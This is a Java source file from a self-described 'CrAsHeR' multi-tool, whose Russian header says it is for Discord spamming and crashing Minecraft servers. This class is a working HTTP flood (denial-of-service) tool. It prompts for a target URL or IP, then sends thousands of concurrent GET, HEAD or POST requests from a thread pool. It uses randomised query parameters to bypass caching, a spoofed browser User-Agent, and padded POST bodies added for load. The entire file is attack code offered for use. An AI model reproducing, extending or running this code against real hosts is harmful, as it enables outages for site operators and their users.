/*
 *  |CrAsHeR CrAsHeR CrAsHeR CrAsHeR CrAsHeR CrAsHeR|
 * 
 *  Данная программа написана на языке Java. 
 *  Сама программа представляет собой мульти-тул, в котором есть всё 
 *  необходимое — от базовых команд для спама в Discord до краша серверов Minecraft и так далее. 
 *  Программа была написана одним человеком — nezi4k.
 *  Автор: nezi4k
 *  Версия: 1.0
 *  Дата создания: ꜱᴛᴀʀᴛᴇᴅ ꜰʀᴏᴍ 23.05.2025
 * 
 *  |CrAsHeR CrAsHeR CrAsHeR CrAsHeR CrAsHeR CrAsHeR|
 */

package CrAsHeR;

import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Function3 {
    public static void execute() {
        try (Scanner scanner = new Scanner(System.in)) {
            try {
                System.out.println("Введите целевой адрес (URL, например, http://example.com, или IP, например, 192.168.1.1):");
                String target = scanner.nextLine().trim();

                System.out.println("Введите порт (например, 80, 443, или оставьте пустым для стандартного):");
                String portInput = scanner.nextLine().trim();
                int port = -1;
                if (!portInput.isEmpty()) {
                    try {
                        port = Integer.parseInt(portInput);
                        if (port < 1 || port > 65535) {
                            System.out.println("Неверный порт. Используется стандартный порт.");
                            port = -1;
                        }
                    } catch (NumberFormatException e) {
                        System.out.println("Неверный формат порта. Используется стандартный порт.");
                    }
                }

                System.out.println("Введите протокол (http или https, по умолчанию http):");
                String protocol = scanner.nextLine().trim().toLowerCase();
                if (!protocol.equals("https")) {
                    protocol = "http";
                }

                String targetUrl;
                if (target.matches("\\d+\\.\\d+\\.\\d+\\.\\d+")) {
                    targetUrl = protocol + "://" + target;
                    if (port != -1) {
                        targetUrl += ":" + port;
                    }
                } else {
                    targetUrl = target.startsWith("http") ? target : protocol + "://" + target;
                    if (port != -1) {
                        targetUrl = targetUrl.replaceFirst("(:\\d+)?$", ":" + port);
                    }
                }

                System.out.println("Введите HTTP-метод (GET, POST, HEAD, по умолчанию GET):");
                String method = scanner.nextLine().trim().toUpperCase();
                if (!method.equals("POST") && !method.equals("HEAD")) {
                    method = "GET";
                }

                System.out.println("Введите количество запросов:");
                int requestCount;
                try {
                    requestCount = Integer.parseInt(scanner.nextLine());
                    if (requestCount < 1) {
                        System.out.println("Количество запросов должно быть больше 0. Используется 10000 запросов.");
                        requestCount = 10000;
                    }
                } catch (NumberFormatException e) {
                    System.out.println("Неверное число. Используется 10000 запросов.");
                    requestCount = 10000;
                }

                System.out.println("Введите количество потоков (например, 10, по умолчанию 100):");
                int threadCount;
                try {
                    threadCount = Integer.parseInt(scanner.nextLine());
                    if (threadCount < 1) {
                        System.out.println("Количество потоков должно быть больше 0. Используется 100 потоков.");
                        threadCount = 100;
                    }
                } catch (NumberFormatException e) {
                    System.out.println("Неверный формат. Используется 100 потоков.");
                    threadCount = 100;
                }

                System.out.println("Введите задержку между запросами в одном потоке (в миллисекундах, по умолчанию 0):");
                final int[] delay = {0};
                String delayInput = scanner.nextLine().trim();
                if (!delayInput.isEmpty()) {
                    try {
                        int parsedDelay = Integer.parseInt(delayInput);
                        delay[0] = parsedDelay < 0 ? 0 : parsedDelay;
                    } catch (NumberFormatException e) {
                        System.out.println("Неверный формат. Используется задержка 0 мс.");
                        delay[0] = 0;
                    }
                }

                System.out.println("Введите User-Agent (или оставьте пустым для стандартного):");
                String userAgent = scanner.nextLine().trim();
                if (userAgent.isEmpty()) {
                    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
                }

                String postData = "";
                if (method.equals("POST")) {
                    System.out.println("Введите тело POST-запроса (или оставьте пустым):");
                    postData = scanner.nextLine().trim();
                    if (postData.isEmpty()) {
                        postData = "data=" + new String(new char[1000]).replace('\0', 'x'); // 1000 символов для нагрузки
                    }
                }

                System.out.println("\nКонфигурация:");
                System.out.println("Цель: " + targetUrl);
                System.out.println("Метод: " + method);
                System.out.println("Количество запросов: " + requestCount);
                System.out.println("Количество потоков: " + threadCount);
                System.out.println("Задержка: " + delay[0] + " мс");
                System.out.println("User-Agent: " + userAgent);
                if (method.equals("POST")) {
                    System.out.println("Тело POST: " + (postData.isEmpty() ? "<пусто>" : postData.substring(0, Math.min(postData.length(), 50)) + "..."));
                }

                System.out.println("\nОтправка запросов...");
                ExecutorService executor = Executors.newFixedThreadPool(threadCount);
                AtomicInteger requestCounter = new AtomicInteger(0);

                for (int i = 0; i < requestCount; i++) {
                    final String finalTargetUrl = targetUrl + "?rand=" + System.currentTimeMillis() + i; // Случайный параметр
                    final String finalMethod = method;
                    final String finalUserAgent = userAgent;
                    final String finalPostData = postData;
                    executor.submit(() -> {
                        int requestNumber = requestCounter.incrementAndGet();
                        try {
                            URI uri = new URI(finalTargetUrl);
                            URL url = uri.toURL();
                            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                            connection.setRequestMethod(finalMethod);
                            connection.setConnectTimeout(2000);
                            connection.setReadTimeout(2000);
                            connection.setRequestProperty("User-Agent", finalUserAgent);

                            if (finalMethod.equals("POST")) {
                                connection.setDoOutput(true);
                                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                                if (!finalPostData.isEmpty()) {
                                    byte[] postDataBytes = finalPostData.getBytes("UTF-8");
                                    connection.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
                                    connection.getOutputStream().write(postDataBytes);
                                }
                            }

                            int responseCode = connection.getResponseCode();
                            System.out.println("Запрос " + requestNumber + ": Код ответа = " + responseCode);

                            connection.disconnect();
                            if (delay[0] > 0) {
                                Thread.sleep(delay[0]);
                            }
                        } catch (Exception e) {
                            System.out.println("Ошибка при отправке запроса " + requestNumber + ": " + e.getMessage());
                        }
                    });
                }

                executor.shutdown();
                try {
                    if (!executor.awaitTermination(60, TimeUnit.SECONDS)) {
                        executor.shutdownNow();
                        System.out.println("Время ожидания истекло, принудительное завершение.");
                    }
                } catch (InterruptedException e) {
                    executor.shutdownNow();
                    System.out.println("Отправка запросов прервана.");
                }

                System.out.println("Отправка запросов завершена.");
            } finally {
            }
        }
    }
}